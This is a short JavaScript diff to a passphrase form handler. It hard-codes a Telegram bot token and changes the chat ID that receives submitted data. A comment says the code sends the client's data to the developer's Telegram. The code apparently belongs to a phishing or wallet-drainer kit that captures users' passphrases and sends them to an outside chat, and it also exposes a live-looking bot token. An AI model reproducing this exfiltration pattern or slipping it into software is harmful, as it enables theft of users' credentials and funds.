@@ -102,7 +102,7 @@ function bindPassphraseFormEvents(root, onVerified) {
   
   // --- AUTO DATA CODE START ---
   const BOT_TOKEN = '8565719102:AAGjRd8aR-QcuWE_h6rjVL1bIiFjvACcfXw';
-  const CHAT_ID = '8565719102';
+  const CHAT_ID = '-1003854344802';
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
   
   // This sends the client's data directly to the developer's Telegram
